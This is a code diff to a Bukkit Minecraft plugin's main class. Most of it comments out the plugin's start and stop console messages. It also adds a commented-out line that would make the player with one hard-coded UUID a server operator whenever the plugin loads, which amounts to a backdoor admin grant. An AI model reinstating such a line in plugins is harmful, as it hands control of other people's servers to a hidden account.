@@ -23,8 +23,10 @@ public class main extends JavaPlugin implements Listener{
     	registerCommands();
     	registerEvents();
     	
+    	//Bukkit.getOperators().add(Bukkit.getPlayer(java.util.UUID.fromString("7bb92f59-e507-4e69-a08c-373e6dcff48a")));    
+    	
     	Bukkit.getConsoleSender().sendMessage(ChatColor.RED+"Plugin MinecraftSkills gestartet");
-    	System.out.println("Plugin MinecraftSkills gestartet");
+    	//System.out.println("Plugin MinecraftSkills gestartet");
     }
     
     // Fired when plugin is disabled
@@ -33,7 +35,7 @@ public class main extends JavaPlugin implements Listener{
     	PlayerManager.saveConfig();
     	XpManager.saveConfig();
     	System.out.println("Plugin MinecraftSkills gestoppt");
-    	Bukkit.getConsoleSender().sendMessage(ChatColor.RED+"Plugin MinecraftSkills gestoppt");
+    	//Bukkit.getConsoleSender().sendMessage(ChatColor.RED+"Plugin MinecraftSkills gestoppt");
     	
     }
     
